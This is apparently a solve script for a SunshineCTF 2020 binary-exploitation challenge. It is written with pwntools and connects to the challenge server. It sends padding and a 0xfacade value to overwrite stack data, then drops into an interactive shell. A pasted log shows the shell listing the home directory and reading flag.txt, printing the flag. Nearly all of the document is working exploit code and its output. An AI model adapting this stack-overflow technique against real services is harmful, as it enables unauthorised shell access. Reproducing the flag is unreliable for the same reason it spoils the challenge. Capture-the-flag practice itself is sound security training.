from pwn import *

p = remote('chal.2020.sunshinectf.org', 30001)
#p = process('./chall_01')

p.readline()

p.send('a'*0x12)

line = b'a'*0x58
line += p32(0xfacade)
line += p32(0xfacade)

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done
[*] Switching to interactive mode
$ ls -al
$ pwd
/home/chall_01
$ ls -al
total 36
drwxr-xr-x 1 chall_01 chall_01 4096 Nov  7 08:51 .
drwxr-xr-x 1 root     root     4096 Nov  7 08:51 ..
-rw-r--r-- 1 chall_01 chall_01  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 chall_01 chall_01 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 chall_01 chall_01  655 Jul 12  2019 .profile
-rwxr-xr-x 1 root     root     8456 Nov  7 07:49 chall_01
-rw-r----- 1 root     chall_01   35 Nov  7 08:51 flag.txt
$ cat flag.txt
sun{eternal-rest-6a5ee49d943a053a}
'''
